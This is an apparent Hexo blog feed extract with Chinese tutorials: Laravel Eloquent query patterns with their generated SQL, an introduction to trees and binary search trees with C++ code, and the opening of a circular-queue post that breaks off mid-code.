class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    OrderModel::selectRaw(<span class="string">"count(order_id), user_order_status"</span>)</span><br><span class="line">      -&gt;groupBy(<span class="string">"user_order_status"</span>)</span><br><span class="line">      -&gt;get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(order_id), user_order_status <span class="keyword">from</span> <span class="string">`order`</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="string">`user_order_status</span></span><br></pre></td></tr></table></figure><p>思路一：将多次聚合统计查询合并为一次查询：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    OrderModel::selectRaw(<span class="string">'COUNT(CASE WHEN `user_order_status` = 0 then 1 END) AS draft_count'</span>)</span><br><span class="line">            -&gt;selectRaw(<span class="string">'COUNT(CASE WHEN `user_order_status` = 1 then 1 END) AS audit_count'</span>)</span><br><span class="line">            -&gt;selectRaw(<span class="string">'COUNT(CASE WHEN `user_order_status` = 2 then 1 END) AS normal_count'</span>)</span><br><span class="line">            -&gt;first();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL 如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">COUNT</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="string">`user_order_status`</span> = <span class="number">0</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">END</span>) <span class="keyword">AS</span> draft_count, <span class="keyword">COUNT</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="string">`user_order_status`</span> = <span class="number">1</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">END</span>) <span class="keyword">AS</span> audit_count, <span class="keyword">COUNT</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="string">`user_order_status`</span> = <span class="number">2</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">END</span>) <span class="keyword">AS</span> normal_count <span class="keyword">from</span> <span class="string">`order`</span> <span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h2><p>一对一关联排序（用户主表与用户辅表）：用户列表可根据用户辅表的某个字段进行排序。</p><p>思路一：子查询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UserModel::select([<span class="string">'uid'</span>, <span class="string">'nickname'</span>])</span><br><span class="line">      -&gt;orderBy(UserInfoModel::select(<span class="string">'broken_number'</span>)</span><br><span class="line">          -&gt;whereColumn(<span class="string">'uid'</span>, <span class="string">'user.uid'</span>)</span><br><span class="line">          -&gt;orderBy(<span class="string">'broken_number'</span>)</span><br><span class="line">          -&gt;limit(<span class="number">1</span>)</span><br><span class="line">      )</span><br><span class="line">      -&gt;paginate(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL 如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`uid`</span>, <span class="string">`nickname`</span> <span class="keyword">from</span> <span class="string">`user`</span> <span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">select</span> <span class="string">`broken_number`</span> <span class="keyword">from</span> <span class="string">`user_info`</span> <span class="keyword">where</span> <span class="string">`uid`</span> = <span class="string">`user`</span>.<span class="string">`uid`</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`broken_number`</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>) <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">20</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>思路二：关联查询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UserModel::select(<span class="string">"user.*"</span>)</span><br><span class="line">        -&gt;join(<span class="string">'user_info'</span>, <span class="string">'user_info.uid'</span>, <span class="string">'='</span>, <span class="string">'user.uid'</span>)</span><br><span class="line">        -&gt;orderBy(<span class="string">'user_info.broken_number'</span>)</span><br><span class="line">        -&gt;paginate(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL 如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`user`</span>.* <span class="keyword">from</span> <span class="string">`user`</span> <span class="keyword">inner</span> <span class="keyword">join</span> <span class="string">`user_info`</span> <span class="keyword">on</span> <span class="string">`user_info`</span>.<span class="string">`uid`</span> = <span class="string">`user`</span>.<span class="string">`uid`</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`user_info`</span>.<span class="string">`broken_number`</span> <span class="keyword">asc</span> <span class="keyword">limit</span> <span class="number">20</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h2><p>一对多关联排序（用户表与订单表）：用户列表展示用户对应创建订单的金额，并根据金额大小进行排序。</p><p>一对多关联的场景不能使用连接查询，因为如果被驱动表中没有关联的数据，驱动表的记录也不会出现在结果列表中，同时涉及到排序和限定查询问题。</p><p>思路：子查询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UserModel::addSelect([</span><br><span class="line">       <span class="string">"cost_amount"</span> =&gt; OrderModel::selectRaw(<span class="string">'sum(total_price)'</span>)</span><br><span class="line">            -&gt;whereColumn(<span class="string">'uid'</span>, <span class="string">'user.uid'</span>)</span><br><span class="line">            -&gt;orderByDesc(<span class="string">"total_price"</span>)</span><br><span class="line">            -&gt;limit(<span class="number">1</span>)</span><br><span class="line">    ])</span><br><span class="line">        -&gt;orderByDesc(<span class="string">"cost_amount"</span>)</span><br><span class="line">        -&gt;paginate(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL 如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`user`</span>.*, (<span class="keyword">select</span> <span class="keyword">sum</span>(total_price) <span class="keyword">from</span> <span class="string">`order`</span> <span class="keyword">where</span> <span class="string">`uid`</span> = <span class="string">`user`</span>.<span class="string">`uid`</span> <span class="keyword">and</span> <span class="string">`order`</span>.<span class="string">`is_deleted`</span> = <span class="string">'0'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`total_price`</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>) <span class="keyword">as</span> <span class="string">`cost_amount`</span> <span class="keyword">from</span> <span class="string">`user`</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`cost_amount`</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">20</span> <span class="keyword">offset</span></span><br></pre></td></tr></table></figure><h2 id="场景六"><a href="#场景六" class="headerlink" title="场景六"></a>场景六</h2><p>基于子查询结合关联模型进行模糊匹配。</p><p>思路：通过一个 EXISTS 子查询实现基于关联模型字段对 User 模型实例的筛选。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     $result = OrderModel::whereHas(<span class="string">"user"</span>, <span class="function"><span class="keyword">function</span> <span class="params">($query)</span> </span>&#123;</span><br><span class="line">            $query-&gt;where(<span class="string">'mobile'</span>, <span class="string">'*******'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">            -&gt;orderByDesc(<span class="string">"order_id"</span>)</span><br><span class="line">            -&gt;paginate(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL 如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`order`</span> <span class="keyword">where</span> <span class="keyword">exists</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`user`</span> <span class="keyword">where</span> <span class="string">`order`</span>.<span class="string">`uid`</span> = <span class="string">`user`</span>.<span class="string">`uid`</span> <span class="keyword">and</span> <span class="string">`mobile`</span> = <span class="string">'*******'</span>) <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`order_id`</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">20</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构（五）二叉搜索树</title>
      <link href="/data-structure-5-binary-search-tree/"/>
      <url>/data-structure-5-binary-search-tree/</url>
      
        <content type="html"><![CDATA[<h2 id="树的概念"><a href="#树的概念" class="headerlink" title="树的概念"></a>树的概念</h2><p>之前介绍的所有的数据结构都是线性存储结构。本章所介绍的树结构是一种非线性存储结构，存储的是具有“一对多”关系的数据元素的集合。</p><a id="more"></a><p><img src="http://c.biancheng.net/uploads/allimg/190427/0944301493-0.png" alt=""></p><p>图 1(A) 是使用树结构存储的集合 {A,B,C,D,E,F,G,H,I,J,K,L,M} 的示意图。对于数据 A 来说，和数据 B、C、D 有关系；对于数据 B 来说，和 E、F 有关系。这就是“一对多”的关系。</p><p>将具有“一对多”关系的集合中的数据元素按照图 1（A）的形式进行存储，整个存储形状在逻辑结构上看，类似于实际生活中倒着的树（图 1（B）倒过来），所以称这种存储结构为“树型”存储结构。</p><h3 id="树的结点"><a href="#树的结点" class="headerlink" title="树的结点"></a>树的结点</h3><p>结点：使用树结构存储的每一个数据元素都被称为“结点”。例如，图 1（A）中，数据元素 A 就是一个结点；</p><ul><li>父结点（双亲结点）、子结点和兄弟结点：对于图 1（A）中的结点 A、B、C、D 来说，A 是 B、C、D 结点的父结点（也称为“双亲结点”），而 B、C、D 都是 A 结点的子结点（也称“孩子结点”）。对于 B、C、D 来说，它们都有相同的父结点，所以它们互为兄弟结点。</li><li>树根结点（简称“根结点”）：每一个非空树都有且只有一个被称为根的结点。图 1（A）中，结点 A 就是整棵树的根结点。</li><li>叶子结点：如果结点没有任何子结点，那么此结点称为叶子结点（叶结点）。例如图 1（A）中，结点 K、L、F、G、M、I、J 都是这棵树的叶子结点。</li></ul><blockquote><p>树根的判断依据为：如果一个结点没有父结点，那么这个结点就是整棵树的根结点。</p></blockquote><h3 id="子树和空树"><a href="#子树和空树" class="headerlink" title="子树和空树"></a>子树和空树</h3><ul><li>子树：如图 1（A）中，整棵树的根结点为结点 A，而如果单看结点 B、E、F、K、L 组成的部分来说，也是棵树，而且节点 B 为这棵树的根结点。所以称 B、E、F、K、L 这几个结点组成的树为整棵树的子树；同样，结点 E、K、L 构成的也是一棵子树，根结点为 E。</li></ul><blockquote><p>注意：单个结点也是一棵树，只不过根结点就是它本身。图 1（A）中，结点 K、L、F 等都是树，且都是整棵树的子树。</p></blockquote><p>知道了子树的概念后，树也可以这样定义：树是由根结点和若干棵子树构成的。</p><ul><li>空树：如果集合本身为空，那么构成的树就被称为空树。空树中没有结点。</li></ul><p>补充：在树结构中，对于具有同一个根结点的各个子树，相互之间不能有交集。例如，图 1（A）中，除了根结点 A，其余元素又各自构成了三个子树，根结点分别为 B、C、D，这三个子树相互之间没有相同的结点。如果有，就破坏了树的结构，不能算做是一棵树。</p><h3 id="有序树和无序树"><a href="#有序树和无序树" class="headerlink" title="有序树和无序树"></a>有序树和无序树</h3><p>如果树中结点的子树从左到右看，谁在左边，谁在右边，是有规定的，这棵树称为有序树；反之称为无序树。</p><p>在有序树中，一个结点最左边的子树称为”第一个孩子”，最右边的称为”最后一个孩子”。</p><p>拿图 1（A）来说，如果是其本身是一棵有序树，则以结点 B 为根结点的子树为整棵树的第一个孩子，以结点<br>D 为根结点的子树为整棵树的最后一个孩子。</p><h2 id="二叉树的定义"><a href="#二叉树的定义" class="headerlink" title="二叉树的定义"></a>二叉树的定义</h2><p>简单地理解，满足以下两个条件的树就是二叉树：</p><ol><li>本身是有序树；</li><li>树中包含的各个节点的度不能超过 2，即只能是 0、1 或者 2；</li></ol><p><img src="http://c.biancheng.net/uploads/allimg/190427/09452LR1-0.gif" alt=""><br>二叉搜索树（又叫做二叉查找树或二叉排序树）具备以下特点：</p><ol><li>每个结点的值均大于其左子树上的任意一个结点的值</li><li>每个结点的值均小于其右子树上任意一个结点的值</li></ol><p>二叉搜索树的基本操作：</p><ul><li><code>BSTNode* BST_Search(BSTree T, int key);</code>：查找关键字 (非递归版本)</li><li><code>BSTNode* BST_SearchR(BSTree T, int key);</code>：查找关键字 (递归版本)</li><li><code>bool BST_Insert(BSTree &amp;T, int key);</code>：二叉排序树插入操作</li><li><code>void BST_Create(BSTree &amp;T, int *elems, int n);</code>：构造二叉排序树</li></ul><h2 id="二叉搜索树的实现"><a href="#二叉搜索树的实现" class="headerlink" title="二叉搜索树的实现"></a>二叉搜索树的实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二叉排序树</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span> *<span class="title">lchild</span>, *<span class="title">rchild</span>;</span></span><br><span class="line">&#125; BSTNode, *BSTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二叉排序树的插入操作</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param T</span></span><br><span class="line"><span class="comment"> * @param i</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">BST_Insert</span><span class="params">(BSTree &amp;T, <span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 首先判断是否是树根</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == T) &#123;</span><br><span class="line">        <span class="comment">// 为新节点申请空间</span></span><br><span class="line">        T = (BSTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSTNode));</span><br><span class="line">        T-&gt;data = key;</span><br><span class="line">        T-&gt;lchild = T-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key == T-&gt;data) &#123;</span><br><span class="line">        <span class="comment">// 发现相同元素</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; T-&gt;data) &#123;</span><br><span class="line">        <span class="comment">// 如果要插入的结点，小于当前结点，将插入左子树</span></span><br><span class="line">        <span class="keyword">return</span> BST_Insert(T-&gt;lchild, key);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果要插入的结点，大于当前结点，则插入右子树</span></span><br><span class="line">        <span class="keyword">return</span> BST_Insert(T-&gt;rchild, key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造二叉排序树</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param T</span></span><br><span class="line"><span class="comment"> * @param elems</span></span><br><span class="line"><span class="comment"> * @param n</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BST_Create</span><span class="params">(BSTree &amp;T, <span class="keyword">int</span> elems[], <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">        BST_Insert(T, elems[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 非递归搜索子树</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param T</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @param p</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">BSTree <span class="title">BST_Search</span><span class="params">(BSTree T, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (T != <span class="literal">NULL</span> &amp;&amp; T-&gt;data != key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (T-&gt;data &lt; key) &#123;</span><br><span class="line">            <span class="comment">// 如果 key 大于当前结点则返回右子树</span></span><br><span class="line">            T = T-&gt;rchild;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果 key 小于当前结点则返回左子树</span></span><br><span class="line">            T = T-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归搜索子树</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param T</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">BSTree <span class="title">BST_SearchR</span><span class="params">(BSTree T, <span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (T != <span class="literal">NULL</span> &amp;&amp; T-&gt;data != key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (T-&gt;data &lt; key) &#123;</span><br><span class="line">            <span class="keyword">return</span> BST_SearchR(T-&gt;rchild, key);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (T-&gt;data &gt; key) &#123;</span><br><span class="line">            <span class="keyword">return</span> BST_SearchR(T-&gt;lchild, key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://c.biancheng.net/view/3383.html" target="_blank" rel="noopener">数据结构的树存储结构</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构（四）队列</title>
      <link href="/data-structure-4-queue/"/>
      <url>/data-structure-4-queue/</url>
      
        <content type="html"><![CDATA[<h2 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h2><p>与栈结构不同的是，队列的两端都”开口”，要求数据只能从一端进，从另一端出，遵循 “先进先出 FIFO (First In First Out)” 的原则。</p><a id="more"></a><p><img src="http://c.biancheng.net/uploads/allimg/190426/1I33AU8-0.gif" alt="对头出队，队尾入队"></p><p>通常，称进数据的一端为 “队尾”，出数据的一端为 “队头”，数据元素进队列的过程称为 “入队”，出队列的过程称为 “出队”。</p><blockquote><p>⚠️ 栈和队列不要混淆，栈结构是一端封口，特点是”先进后出”；而队列的两端全是开口，特点是”先进先出”。</p></blockquote><h2 id="队列的顺序存储（循环队列）"><a href="#队列的顺序存储（循环队列）" class="headerlink" title="队列的顺序存储（循环队列）"></a>队列的顺序存储（循环队列）</h2><p>在顺序表的基础上实现的队列结构。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxSize 100                 <span class="comment">// 定义队列中元素的最大个数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 队列的顺序存储 (循环队列)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;               <span class="comment">// 元素数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SqQueue</span>&#123;</span></span><br><span class="line">    ElemType data[MaxSize];         <span class="comment">// 存放队列元素</span></span><br><span class="line">    <span class="keyword">int</span> front;                      <span class="comment">// 队首</span></span><br><span class="line">    <span class="keyword">int</span> rear;                       <span class="comment">// 对头</span></span><br><span class="line">&#125; SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化队列</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span></span>&#123;</span><br><span class="line">   Q.rear = Q.front = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断队列是否为空</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">QueueEmpty</span><span class="params">(SqQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 当队列中没有元素时，对首和队尾指向同一块地址</span></span><br><span class="line">    <span class="keyword">if</span> (Q.rear == Q.front) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入队</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> * @param x</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q, ElemType x)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断队列是否已满</span></span><br><span class="line">    <span class="keyword">if</span> ((Q.rear + <span class="number">1</span>) %MaxSize == Q.front) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每次新元素入队时，队尾都需要 "+1"，方便下一次可以新元素直接入队</span></span><br><span class="line">    Q.data[Q.rear] = x;</span><br><span class="line">    Q.rear = (Q.rear + <span class="number">1</span>) % MaxSize;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q, ElemType &amp;x)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断队列是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (QueueEmpty(Q)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每次旧元素出对时，对头都需要 